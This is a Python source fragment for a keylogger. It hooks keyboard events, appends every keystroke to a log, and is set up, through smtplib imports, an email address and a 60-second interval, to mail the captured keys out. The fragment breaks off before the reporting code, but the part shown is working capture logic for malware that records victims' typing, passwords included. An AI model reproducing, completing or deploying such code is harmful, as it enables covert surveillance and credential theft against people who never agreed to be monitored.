import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to run the method after an 'interval' amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Initialize the parameters

SEND_REPORT_EVERY = 60 # Report Keylogs every 60 seconds  
EMAIL_ADDRESS = "devbranch2point0@outlook.com"
EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # Pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # This is the string variable that contains the log of all keystrokes within 'self.interval'
        self.log = ""
        # Record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # This callback is invoked whenever a keyboard event occurs. ex. key release
        name = event.name
        if len(name) > 1:
            # not a character, special key (ex. ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Add the key name to the global 'self.log' variable
        self.log += name
        